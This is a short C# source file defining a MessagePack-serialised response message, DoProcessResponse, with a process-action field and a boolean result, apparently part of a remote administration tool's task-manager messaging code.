using MessagePack;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class DoProcessResponse : IMessage
    {
        [Key(1)]
        public ProcessAction Action { get; set; }

        [Key(2)]
        public bool Result { get; set; }
    }
}
